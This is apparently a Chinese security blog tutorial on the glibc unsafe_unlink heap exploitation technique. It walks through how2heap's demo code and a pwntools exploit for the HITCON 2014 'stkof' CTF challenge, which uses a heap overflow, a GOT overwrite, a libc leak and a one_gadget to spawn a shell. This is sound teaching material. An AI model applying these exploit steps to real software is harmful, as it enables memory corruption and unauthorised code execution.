# How2Heap堆利用学习笔记（三）：Unsafe_unlink

阅读量 **882004**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-02-10 11:30:50

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t01cca9ce390216e96f.png)

这里是How2Heap学习的第三部分，Unsafe_Unlink。

Unlink是堆利用中最典型的技术之一，早期的Unlink技术能让攻击者非常轻易的实现一个任意地址写。在近现代的glibc中，为unlink操作添加了一些检查机制，但是通过一些精妙的绕过手法，unlink技术也并非彻底被埋没。

## 0x01 Unsafe_Unlink

###  前置知识

Unlink故名思义，取消链接，是内存管理对堆块（chunk）的一种拆离手段。简单来说，就是将一个chunk从双向链表中拆离下来。显然，这种利用Unlink的手段针对的是除fastbin以外的其他几个bin链。

_Unlink的原理图（摘自CTFwiki）_

![](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/implementation/figure/unlink_smallbin_intro.png)

unlink的define在 _malloc/malloc.c_ 文件中

    
    
    #define unlink(AV, P, BK, FD) {                                            
        FD = P->fd;                                      
        BK = P->bk;                                      
        if (__builtin_expect (FD->bk != P || BK->fd != P, 0))              
          malloc_printerr (check_action, "corrupted double-linked list", P, AV);  
        else {                                      
            FD->bk = BK;                                  
            BK->fd = FD;    
      ...
    

在早期的unlink利用技术中，常常选择覆盖堆块P的fd和bk值。例如将P->fd覆盖为需要写的地址`-3*sizeof(int)`的位置，然后将P->bk覆盖为要写入的数据，在CTF中经常使用one_gadget来覆盖got表，实现getshell。

而现代glibc中为unlink添加了数条检查命令（本实验只需关注其中的一条），试图延缓攻击者对unlink的利用。笔者的glibc版本为2.23，与ubuntu16.04的默认glibc版本相符。

  * 检测P的fd的bk是否指向P，P的bk的fd是否指向P。

    
    
        if (__builtin_expect (FD->bk != P || BK->fd != P, 0))              
          malloc_printerr (check_action, "corrupted double-linked list", P, AV);  
    

**_绕过方式_**

绕过方式也很简单，但是需要一定的条件。

我们需要一个全局变量，最好程序编译选项没有添加PIE。

因为指针检查`P->fd->bk==P`，所以如果我们的P值是一个全局变量，这样P的指针地址就能够确定。如果将fd改为`&P-sizeof(int)*3`，当P->fd对bk进行解引用的时候就会发现，bk==P，成功绕过检查。当然，同样的操作对`P->bk->fd==P`检查也是一样的解决方法，即将bk改为`&P-sizeof(int)*2`。

当我们绕过了检测部分，程序就会开始真正的unlink。观察此时的内存，会发现我们全局指针P被改为了`&P-sizeof(int)*3`，其实也非常好理解，我们的FD值被赋值给了BK->fd,而fd被我们修改为了`&P-sizeof(int)*3`。

    
    
        p->fd->bk=p->bk    //FD->bk = BK;                                  
        p->bk->fd=p->fd    //BK->fd = FD;
    

也就是说，如果此时我们能对堆块P进行写入，就能够控制P指针本身的值，接下来就可以很容易地实现任意地址读写。

**_最后，我们来看一下unlink的触发条件_**

在_int_free函数中出发unlink的两种情况，在free一个非fastbin大小的chunk时，会对前后的chunk进行检测，如果前后的chunk存在被free的状态，则会进行合并。合并之前自然也需要用unlink将其从链表上取下来。

前一种情况我们在上一篇[文章](https://www.anquanke.com/post/id/193132)的 **实例分析** 中也提到过。

  * 当检测到prev_inuse为0，即上一个chunk被free，则会触发unlink。会根据presize值，确定前一个chunk的大小，然后将prechunk和当前chunk（p）合并。

    
    
        /* consolidate backward */
        if (!prev_inuse(p)) {
          prevsize = p->prev_size;
          size += prevsize;  //size相加
          p = chunk_at_offset(p, -((long) prevsize));//获取前一个chunk的起始地址，存放在p中
          unlink(av, p, bck, fwd);
        }
    

  * 当检测到nextinuse为0，即下一个chunk被free，也会触发unlink

    
    
          /* consolidate forward */
          if (!nextinuse) {
        unlink(av, nextchunk, bck, fwd);
        size += nextsize;
          } else
        clear_inuse_bit_at_offset(nextchunk, 0);
    

`prev_inuse`是p->size的最低位，用于存储上一个chunk是否被释放的信息。检测该位的宏定义

    
    
    /* size field is or'ed with PREV_INUSE when previous adjacent chunk in use */
    #define PREV_INUSE 0x1
    
    /* extract inuse bit of previous chunk */
    #define prev_inuse(p)       ((p)->size & PREV_INUSE)
    

需要注意的是，此处指的上一个和下一个chunk是物理空间相邻的。

###  代码分析

unsafe_unlink.c

    
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <stdint.h>
    
    
    uint64_t *chunk0_ptr;
    
    int main()
    {
        fprintf(stderr, "Welcome to unsafe unlink 2.0!n");
        fprintf(stderr, "Tested in Ubuntu 14.04/16.04 64bit.n");
        fprintf(stderr, "This technique can be used when you have a pointer at a known location to a region you can call unlink on.n");
        fprintf(stderr, "The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.n");
    
        int malloc_size = 0x80; //we want to be big enough not to use fastbins
        int header_size = 2;
    
        fprintf(stderr, "The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.nn");
    
        chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
        uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
        fprintf(stderr, "The global chunk0_ptr is at %p, pointing to %pn", &chunk0_ptr, chunk0_ptr);
        fprintf(stderr, "The victim chunk we are going to corrupt is at %pnn", chunk1_ptr);
    
        fprintf(stderr, "We create a fake chunk inside chunk0.n");
        fprintf(stderr, "We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.n");
        chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
        fprintf(stderr, "We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.n");
        fprintf(stderr, "With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == Falsen");
        chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
        fprintf(stderr, "Fake chunk fd: %pn",(void*) chunk0_ptr[2]);
        fprintf(stderr, "Fake chunk bk: %pnn",(void*) chunk0_ptr[3]);
    
        fprintf(stderr, "We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.n");
        uint64_t *chunk1_hdr = chunk1_ptr - header_size;
        fprintf(stderr, "We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.n");
        fprintf(stderr, "It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordinglyn");
        chunk1_hdr[0] = malloc_size;
        fprintf(stderr, "If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %pn",(void*)chunk1_hdr[0]);
        fprintf(stderr, "We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.nn");
        chunk1_hdr[1] &= ~1;
    
        fprintf(stderr, "Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.n");
        fprintf(stderr, "You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344nn");
        free(chunk1_ptr);
    
        fprintf(stderr, "At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.n");
        char victim_string[8];
        strcpy(victim_string,"Hello!~");
        chunk0_ptr[3] = (uint64_t) victim_string;
    
        fprintf(stderr, "chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.n");
        fprintf(stderr, "Original value: %sn",victim_string);
        chunk0_ptr[0] = 0x4141414142424242LL;
        fprintf(stderr, "New Value: %sn",victim_string);
    }
    

程序申请了一个全局变量`uint64_t *chunk0_ptr;`通过反汇编可以看到，或者readelf
-S，全局变量的地址是编译在ELF里的，在不开启PIE的情况下，这个地址是不会变化的。

![](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/AXci6e.png)

申请两个堆块，并将chunk0的地址保存到全局变量chunk0_ptr中，malloc_size需要大于64，否则会被free到fastbin中。

    
    
        chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
        uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
    

修改chunk0的fd和bk，按照之前的绕过方式来覆写FD和BK。我们在chunk0中创建了一个fakechunk。

当然，其实fakechunk的具体位置都是我们自定义的，只需要让pre size这个参数被覆盖的恰到好处(下文会讲)，能够指向我们的fake
chunk即可。典型的案例还是可以追溯到我们上个文章的[案例分析2](https://www.anquanke.com/post/id/193132#h3-6)。

这些操作是通过指针直接操作的，仅仅方便演示。在实际的漏洞利用中，可以通过堆溢出/Double Free来实现FD和BK的覆写。

    
    
        fprintf(stderr, "We create a fake chunk inside chunk0.n");
        fprintf(stderr, "We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.n");
        chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
        fprintf(stderr, "We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.n");
        fprintf(stderr, "With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == Falsen");
        chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
    
    
    
    gef➤  x/20xg  0x603010-0x10
    0x603000:    0x0000000000000000    0x0000000000000091 <--chunk0
    0x603010:    0x0000000000000000    0x0000000000000000
    0x603020:    0x0000000000602058    0x0000000000602060 <--P->fd P->bk
    0x603030:    0x0000000000000000    0x0000000000000000
    0x603040:    0x0000000000000000    0x0000000000000000
    0x603050:    0x0000000000000000    0x0000000000000000
    0x603060:    0x0000000000000000    0x0000000000000000
    0x603070:    0x0000000000000000    0x0000000000000000
    0x603080:    0x0000000000000000    0x0000000000000000
    0x603090:    0x0000000000000000    0x0000000000000091 <--chunk1
    

我们需要在chunk1处，将pre size位写为一个合适的数据。Unlink之前，程序会根据presize来寻找要合并的chunk的头部。

这里因为我们的fakechunk和chunk0的头部相同，所以size也就直接沿用chunk0的size即可。

    
    
    uint64_t *chunk1_hdr = chunk1_ptr - header_size;
        fprintf(stderr, "We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.n");
        fprintf(stderr, "It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordinglyn");
        chunk1_hdr[0] = malloc_size;
    

将pre inuse设置为0，这样才能触发合并，产生Unlink。

    
    
    fprintf(stderr, "We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.nn");
        chunk1_hdr[1] &= ~1;
    

触发合并，让我们从内存层面来了解一下这个过程。

    
    
    fprintf(stderr, "Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.n");
    free(chunk1_ptr);
    

触发合并之前

    
    
    gef➤  x/20xg  0x602070-0x20
    0x602050:    0x0000000000000000    0x0000000000000000
    0x602060 <stderr@@GLIBC_2.2.5>:    0x00007ffff7dd2540    0x0000000000000000
    0x602070 <chunk0_ptr>:    0x0000000000603010    0x0000000000000000
    

触发之后，修改了全局变量ptr的值。

    
    
    gef➤  x/20xg  0x602070-0x20
    0x602050:    0x0000000000000000    0x0000000000000000
    0x602060 <stderr@@GLIBC_2.2.5>:    0x00007ffff7dd2540    0x0000000000000000
    0x602070 <chunk0_ptr>:    0x0000000000602058 <--修改为FD的值 0x0000000000000000
    

通过对chunk0_ptr进行写入，能够实现修改任意一块地址的数据。案例中我们修改了一个字符串的数据，并且打印了出来。

    
    
        fprintf(stderr, "At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.n");
        char victim_string[8];
        strcpy(victim_string,"Hello!~");
        chunk0_ptr[3] = (uint64_t) victim_string;
    
        fprintf(stderr, "chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.n");
        fprintf(stderr, "Original value: %sn",victim_string);
        chunk0_ptr[0] = 0x4141414142424242LL;
        fprintf(stderr, "New Value: %sn",victim_string);
    

## 0x02 案例分析

###  HITCON CTF 2014-stkof

HITCON一道比较经典的题目，难度也比较低，非常适合作为unlink的原理解析。当然，这道题的漏洞问题比较大，解法不唯一，除了Unlink以外，使用fastbin
attack也可以解决。

[下载链接](https://github.com/ctfs/write-ups-2014/blob/master/hitcon-ctf-2014/stkof/a679df07a8f3a8d590febad45336d031-stkof)

**题目分析**

题目给的二进制文件比较简单，源代码应该是一个`switch case`的结构，反汇编后的伪代码如下

    
    
    __int64 __fastcall main(__int64 a1, char **a2, char **a3)
    {
      int v3; // eax
      signed int v5; // [rsp+Ch] [rbp-74h]
      char nptr; // [rsp+10h] [rbp-70h]
      unsigned __int64 v7; // [rsp+78h] [rbp-8h]
    
      v7 = __readfsqword(0x28u);
      alarm(0x78u);
      while ( fgets(&nptr, 10, stdin) ) //获取输入
      {
        v3 = atoi(&nptr);
        if ( v3 == 2 )
        {
          v5 = sub_4009E8(); //向堆块写入数据
          goto LABEL_14;
        }
        if ( v3 > 2 )
        {
          if ( v3 == 3 )
          {
            v5 = sub_400B07();//释放堆块
            goto LABEL_14;
          }
          if ( v3 == 4 )
          {
            v5 = sub_400BA9();//Useless
            goto LABEL_14;
          }
        }
        else if ( v3 == 1 )
        {
          v5 = sub_400936();//申请堆块
          goto LABEL_14;
        }
        v5 = -1;
    LABEL_14:
        if ( v5 )
          puts("FAIL");
        else
          puts("OK");
        fflush(stdout);
      }
      return 0LL;
    }
    

使用pwntools来编写交互接口，前三个操作分别为分配内存，写入数据，释放内存，第四个操作是useless的。

漏洞存在于write部分，程序并没有规定写入数据的长度，导致产生heap overflow。

    
    
    def malloc(size):
        p.sendline("1")
        p.sendline(size)
    def write(chunk,size,strs):
        p.sendline("2")
        p.sendline(chunk)    
        p.sendline(size)
        p.sendline(strs)
    def free(chunk):
        p.sendline("3")
        p.sendline(chunk)
    

**利用手法**

我们申请五个内存块，大小为0x80字节（small
bin的大小）此处的第一个chunk属于无用chunk，申请后的空间与之后的chunk内存空间不连续。主要实现unlink的是中间的三个chunk（2，3，4），创建chunk5在chunk4和topchunk之间，是为了防止chunk4在free时，被top
chunk直接合并，导致unlink失败。

    
    
    #Unlink
    malloc("128") #chunk1 use later
    malloc("128") #chunk2
    malloc("128") #chunk3
    malloc("128") #chunk4 
    malloc("128") #chunk5 avoid topchunk
    
    free("3") # free chunk3-->unsort bins
    #write("2",,) #wirte chunk2 heap overflow -->chunk3(free)
    free("4") #unlink
    

第一次free chunk3，查看unsort bins。只有一个chunk3连接在bins。

    
    
    gef➤  heap bins unsorted 
    ────────────────────[ Unsorted Bin for arena 'main_arena' ]────────────────────
    [+] Found base for bin(0): fw=0x184a540, bk=0x184a540
     →   FreeChunk(addr=0x184a550,size=0x90)
    

然后free chunk4 ，查看unsrot bins，发现还是只有一个chunk，但是这个chunk其实是chunk3和chunk4的合并，在free
chunk4的过程中，调用了unlink(chunk3)。

    
    
    gef➤  heap bins unsorted 
    ────────────────────[ Unsorted Bin for arena 'main_arena' ]────────────────────
    [+] Found base for bin(0): fw=0x184a540, bk=0x184a540
     →   FreeChunk(addr=0x184a550,size=0x120)
    

于是我们构造Unlink，当然与上文不同的是我们并不能真的将chunk3
free，因为我们需要chunk的指针还在数组中，作为绕过unlink检查机制的一部分。

如何进行Overflow。

  * 覆盖PRE INUSE位为0，就可以伪造上一个chunk为free
  * 覆盖 PRE SIZE，这样可以自由控制fake chunk 的大小。

**触发Unlink**

代码如下，我们在chunk2中构造了一个0x80的fake chunk。

    
    
    #Unlink
    malloc("128") #chunk1 use later
    malloc("128") #chunk2
    malloc("128") #chunk3
    malloc("128") #chunk4 avoid topchunk
    
    global_ptr=0x602150
    sizeofint=8
    write("2","144",p64(0)+p64(0x80)+p64(global_ptr-3*sizeofint)+p64(global_ptr-2*sizeofint)+'a'*96+p64(0x80)+p64(0x90)) ##wirte chunk2 heap overflow
    
    free("3") #unlink
    

Unlink之后，修改全局变量global_ptr

    
    
    gef➤  x/20xg 0x602140
    0x602140:    0x0000000000000000    0x00000000026be020
    0x602150:    0x0000000000602138<-- global ptr    0x0000000000000000
    0x602160:    0x00000000026be5e0    0x0000000000000000
    

**报错解答**

unlink的时候还有一个需要检查的部分是，chunk2（/fake_chunk）的size和chunk3的pre siz是否匹配。pre
size的位置在chunk_header的位置，即`&size-8`的位置。

所以既然能够控制pre size，我们也就不局限于使用chunk2了，我们可以在chunk2中构建一个fake chunk。

    
    
    *** Error in `./stkof': corrupted size vs. prev_size: 0x0000000001f144af
    

**Get Shell**

此时我们可以通过修改chunk1的指针，来实现无限次数的任意地址写(只要我们不一不小心修改chunk3的指针

    
    
    def write_anywhere(addr,size,strs):
        write("2","24",p64(1)*2+p64(addr))
        write("1",size,strs)
    write_anywhere(0x6021a8,"8",p64(0x1234567)) #example
    

将free的got表项改为put，这样还实现了任意地址写

    
    
    write_anywhere(0x602018,"8",p64(0x400766)) # free_got->put_got
    def read_anywhere(addr):
        write("2","24",p64(1)*2+p64(addr))
        free("1")
    read_anywhere(0x602020) #example
    

通过pust函数来 _Leak Address_ ，计算出libc的地址

    
    
    read_anywhere(0x602020)
    p.recv(0x37)
    libc_base=u64(p.recv(6).ljust(8,"x00"))-0x6f690
    print "libc_base="+hex(libc_base)
    

最后，直接用one_gadget”解决战斗”。

    
    
    one_gadget=0xf02a4
    write_anywhere(0x602018,"8",p64(one_gadget+libc_base))
    print "[+] one_gadget="+hex(one_gadget+libc_base)
    free("1")
    

Getshell

    
    
    process 10908 is executing new program: /bin/dash
    $ whoami
    migraine
    

## 小结

Unsafe_Unlink在原理上是非常简单的一种攻击手段，关键点并不在漏洞本身，Unlink技术的有趣之处在于它扩充了攻击面。例如在[上一篇文章](https://www.anquanke.com/post/id/193132)中的consolidate手段在没有unlink的情况下是很难完成一次利用的（也许），同时unlink也需要一些条件，这样就很容易形成两个手段相结合的技术，这样的题目就会非常有趣。（Hack
for fun！）

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Migraine殇** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/197635](/post/id/197635)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)

 **+1** __16赞

 __收藏

![](https://p1.ssl.qhimg.com/t017c97fc7e3becfd42.jpg) Migraine殇

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

